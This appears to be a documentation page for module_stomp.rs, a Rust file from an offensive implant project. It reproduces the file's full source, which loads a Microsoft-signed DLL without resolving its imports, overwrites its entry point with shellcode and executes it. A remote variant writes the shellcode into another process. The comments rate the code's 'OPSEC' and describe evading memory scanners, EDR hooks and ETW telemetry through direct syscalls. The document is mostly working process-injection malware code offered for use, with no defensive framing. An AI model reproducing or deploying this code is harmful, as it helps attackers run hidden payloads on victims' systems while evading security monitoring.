# crowd — module_stomp.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscall path)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/module_stomp.rs` |
| **Lines** | 254 |
| **Tier** | U |
| **Cards** | T007-process-injection |
| **Role** | Module stomping |
| **Unsafe blocks** | 2 |

## Purpose

# crowd — module_stomp.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscall path)

## Module Stomping (OPSEC 9.0)

Loads a legitimate, signed DLL (e.g. `chakra.dll`) into the process without
resolving its dependencies (`DONT_RESOLVE_DLL_REFERENCES`), then overwrites
the DLL's entry point with shellcode.  The payload executes from a
`MEM_IMAGE` region backed by a Microsoft-signed DLL — invisible to scanners
that check `MemoryType` or `MappedFileName`.

Different from:
- `stomp.rs` (PE Header Stomping — zeroes MZ/DOS/NT headers)
- `func_stomp.rs` (Function Stomping — overwrites a single export)
- `overload.rs` (Module Overloading — NtCreateSection+NtMapViewOfSection)

This technique overwrites the **entire entry point region** of the loaded DLL.

## OPSEC upgrades (A → S):
- VirtualProtect calls → NtProtectVirtualMemory via RecycledGate syscall dispatch
- NtCreateThreadEx via RecycledGate (already migrated in previous pass)
- Handle cleanup via NtClose RecycledGate
- ETW-TI sees all memory ops from ntdll .text, not implant memory

## Constants

- `DEFAULT_STOMP_DLL`: `&str` = `"chakra.dll"`

## Public API

### `stomp_and_execute` (line 43)
```rust
pub fn stomp_and_execute(shellcode: &[u8], dll_name: Option<&str>) -> Result<(), String>
```
Loads a DLL without resolving imports, finds its entry point via PE
header parsing, overwrites the entry point with shellcode, restores
memory protection, and executes via CreateThread.

# Arguments
* `shellcode` — The payload to inject
* `dll_name`  — Optional DLL name (defaults to `chakra.dll`)

# Returns
`Ok(())` on success, `Err` with description on failure.

### `stomp_remote` (line 189)
```rust
pub fn stomp_remote(
```
Remote variant: loads a DLL in the target process and writes shellcode
to its entry point.  Uses NtCreateSection + NtMapViewOfSection to get
MEM_IMAGE backing, then overwrites the entry point region.

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — module_stomp.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscall path)
//!
//! ## Module Stomping (OPSEC 9.0)
//!
//! Loads a legitimate, signed DLL (e.g. `chakra.dll`) into the process without
//! resolving its dependencies (`DONT_RESOLVE_DLL_REFERENCES`), then overwrites
//! the DLL's entry point with shellcode.  The payload executes from a
//! `MEM_IMAGE` region backed by a Microsoft-signed DLL — invisible to scanners
//! that check `MemoryType` or `MappedFileName`.
//!
//! Different from:
//! - `stomp.rs` (PE Header Stomping — zeroes MZ/DOS/NT headers)
//! - `func_stomp.rs` (Function Stomping — overwrites a single export)
//! - `overload.rs` (Module Overloading — NtCreateSection+NtMapViewOfSection)
//!
//! This technique overwrites the **entire entry point region** of the loaded DLL.
//!
//! ## OPSEC upgrades (A → S):
//! - VirtualProtect calls → NtProtectVirtualMemory via RecycledGate syscall dispatch
//! - NtCreateThreadEx via RecycledGate (already migrated in previous pass)
//! - Handle cleanup via NtClose RecycledGate
//! - ETW-TI sees all memory ops from ntdll .text, not implant memory

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
#[allow(unused_imports)]
use crate::mega_dbg;

/// Default DLL to stomp — large, rarely loaded, Microsoft-signed.
const DEFAULT_STOMP_DLL: &str = "chakra.dll";

/// Loads a DLL without resolving imports, finds its entry point via PE
/// header parsing, overwrites the entry point with shellcode, restores
/// memory protection, and executes via CreateThread.
///
/// # Arguments
/// * `shellcode` — The payload to inject
/// * `dll_name`  — Optional DLL name (defaults to `chakra.dll`)
///
/// # Returns
/// `Ok(())` on success, `Err` with description on failure.
pub fn stomp_and_execute(shellcode: &[u8], dll_name: Option<&str>) -> Result<(), String> {
    let target_dll = dll_name.unwrap_or(DEFAULT_STOMP_DLL);
    mega_dbg!("ModuleStomp: loading '{}' (DONT_RESOLVE_DLL_REFERENCES)", target_dll);

    unsafe {
        // 1. Load DLL without resolving dependencies
        let mut dll_cstr = target_dll.as_bytes().to_vec();
        dll_cstr.push(0);

        let h_module = winapi::um::libloaderapi::LoadLibraryExA(
            dll_cstr.as_ptr() as *const i8,
            std::ptr::null_mut(),
            winapi::um::libloaderapi::DONT_RESOLVE_DLL_REFERENCES,
        );

        if h_module.is_null() {
            return Err(format!("ModuleStomp: LoadLibraryExA('{}') failed", target_dll));
        }

        mega_dbg!("ModuleStomp: '{}' loaded at {:p}", target_dll, h_module);

        // 2. Parse PE headers to find AddressOfEntryPoint
        let base = h_module as *const u8;
        let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;

        // Validate MZ signature
        if *(base as *const u16) != 0x5A4D {
            winapi::um::libloaderapi::FreeLibrary(h_module);
            return Err("ModuleStomp: invalid MZ signature".into());
        }

        // Parse PE headers — handle both PE32 and PE32+ via Magic field
        let nt_headers_raw = base.add((*dos_header).e_lfanew as usize);

        // Validate PE signature (common to both PE32 and PE32+)
        let pe_sig = *(nt_headers_raw as *const u32);
        if pe_sig != 0x0000_4550 {
            winapi::um::libloaderapi::FreeLibrary(h_module);
            return Err("ModuleStomp: invalid PE signature".into());
        }

        // Check OptionalHeader.Magic to determine PE32 vs PE32+
        // Magic field is at offset 24 from start of NT headers (after Signature + FileHeader)
        let magic = *(nt_headers_raw.add(24) as *const u16);
        let entry_rva = if magic == 0x020B {
            // PE32+ (64-bit)
            let nt64 = nt_headers_raw as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            (*nt64).OptionalHeader.AddressOfEntryPoint as usize
        } else if magic == 0x010B {
            // PE32 (32-bit)
            let nt32 = nt_headers_raw as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
            (*nt32).OptionalHeader.AddressOfEntryPoint as usize
        } else {
            winapi::um::libloaderapi::FreeLibrary(h_module);
            return Err(format!("ModuleStomp: unknown PE magic 0x{:04x}", magic));
        };
        let entry_point = (base as usize + entry_rva) as *mut c_void;

        mega_dbg!("ModuleStomp: entry point at {:p} (RVA=0x{:x})", entry_point, entry_rva);

        let image_size = if magic == 0x020B {
            let nt64 = nt_headers_raw as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            (*nt64).OptionalHeader.SizeOfImage as usize
        } else {
            let nt32 = nt_headers_raw as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
            (*nt32).OptionalHeader.SizeOfImage as usize
        };
        if shellcode.len() > image_size {
            winapi::um::libloaderapi::FreeLibrary(h_module);
            return Err("ModuleStomp: shellcode larger than DLL image".into());
        }

        // 3. Change protection to RW via NtProtectVirtualMemory (RecycledGate)
        let current_proc = (-1isize) as usize; // NtCurrentProcess
        let mut base_rw = entry_point;
        let mut size_rw = shellcode.len();
        let mut old_protect: u32 = 0;
        let status = crate::recycled::nt_protect_virtual_memory(
            current_proc,
            &mut base_rw,
            &mut size_rw,
            0x04, // PAGE_READWRITE
            &mut old_protect,
        );
        if status < 0 {
            winapi::um::libloaderapi::FreeLibrary(h_module);
            return Err(format!("ModuleStomp: NtProtectVirtualMemory(RW) failed (0x{:08x})", status as u32));
        }

        // 4. Copy shellcode over the entry point
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            entry_point as *mut u8,
            shellcode.len(),
        );

        mega_dbg!("ModuleStomp: {}B shellcode written to entry point", shellcode.len());

        // 5. Restore protection (RX) via NtProtectVirtualMemory (RecycledGate)
        let mut base_rx = entry_point;
        let mut size_rx = shellcode.len();
        let mut dummy: u32 = 0;
        crate::recycled::nt_protect_virtual_memory(
            current_proc,
            &mut base_rx,
            &mut size_rx,
            old_protect,
            &mut dummy,
        );

        // 6. Execute via NtCreateThreadEx (RecycledGate — avoids CreateThread ETW telemetry)
        //    CreateThread is heavily monitored by EDRs; NtCreateThreadEx via syscall
        //    eliminates the user-mode hook interception.
        let current_proc = (-1isize) as usize; // NtCurrentProcess pseudo-handle
        let mut h_thread: usize = 0;
        let status = crate::recycled::nt_create_thread_ex(
            &mut h_thread,
            0x001F_FFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut() as *mut c_void,
            current_proc,
            entry_point as *const c_void,
            std::ptr::null_mut() as *mut c_void,  // no argument
            0,  // flags = 0 (start immediately)
            0, 0, 0,
            std::ptr::null_mut() as *mut c_void,
        );

        if status < 0 || h_thread == 0 {
            // FreeLibrary on failure — the stomped module is useless without execution
            winapi::um::libloaderapi::FreeLibrary(h_module);
            return Err(format!("ModuleStomp: NtCreateThreadEx failed (0x{:08x})", status as u32));
        }

        mega_dbg!("ModuleStomp: thread created via syscall, shellcode executing");

        // Wait for execution then close handle
        winapi::um::synchapi::WaitForSingleObject(h_thread as _, 10_000);
        crate::recycled::nt_close(h_thread);
    }

    Ok(())
}

/// Remote variant: loads a DLL in the target process and writes shellcode
/// to its entry point.  Uses NtCreateSection + NtMapViewOfSection to get
/// MEM_IMAGE backing, then overwrites the entry point region.
pub fn stomp_remote(
    h_process: usize,
    shellcode: &[u8],
    dll_name: Option<&str>,
) -> Result<(), String> {
    let target_dll = dll_name.unwrap_or(DEFAULT_STOMP_DLL);
    mega_dbg!("ModuleStomp[remote]: stomping '{}' in PID handle=0x{:x}", target_dll, h_process);

    unsafe {
        // First load locally to parse the entry point RVA
        let mut dll_cstr = target_dll.as_bytes().to_vec();
        dll_cstr.push(0);

        let h_local = winapi::um::libloaderapi::LoadLibraryExA(
            dll_cstr.as_ptr() as *const i8,
            std::ptr::null_mut(),
            winapi::um::libloaderapi::DONT_RESOLVE_DLL_REFERENCES,
        );

        if h_local.is_null() {
            return Err(format!("ModuleStomp[remote]: LoadLibraryExA failed for '{}'", target_dll));
        }

        let base = h_local as *const u8;
        let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        let nt_raw = base.add((*dos).e_lfanew as usize);
        let magic = *(nt_raw.add(24) as *const u16);
        let entry_rva = if magic == 0x020B {
            let nt64 = nt_raw as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            (*nt64).OptionalHeader.AddressOfEntryPoint as usize
        } else if magic == 0x010B {
            let nt32 = nt_raw as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
            (*nt32).OptionalHeader.AddressOfEntryPoint as usize
        } else {
            winapi::um::libloaderapi::FreeLibrary(h_local);
            return Err(format!("ModuleStomp[remote]: unknown PE magic 0x{:04x}", magic));
        };

        winapi::um::libloaderapi::FreeLibrary(h_local);

        // Map the DLL into the target process via Module Overloading path
        let dll_path = format!(r"C:\Windows\System32\{}", target_dll);
        let remote_base = crate::chain::load_dll_into_target(h_process, &dll_path)
            .map_err(|e| format!("ModuleStomp[remote]: map failed — {}", e))?;

        // Write shellcode at the entry point via NtWriteVirtualMemory (RecycledGate)
        let remote_entry = (remote_base + entry_rva) as *mut c_void;
        let mut written: usize = 0;

        let status = crate::recycled::nt_write_virtual_memory(
            h_process,
            remote_entry,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut written,
        );

        if status < 0 {
            return Err(format!("ModuleStomp[remote]: NtWriteVirtualMemory failed (0x{:08x})", status as u32));
        }

        mega_dbg!("ModuleStomp[remote]: {}B written at {:p} via syscall", written, remote_entry);
    }

    Ok(())
}

```